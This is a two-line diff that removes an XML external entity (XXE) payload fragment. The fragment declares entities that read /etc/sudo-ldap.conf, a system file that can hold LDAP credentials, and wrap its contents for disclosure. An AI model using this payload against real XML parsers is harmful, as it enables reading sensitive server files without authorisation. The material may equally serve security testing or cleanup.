@@ -1,2 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/sudo-ldap.conf">
-<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
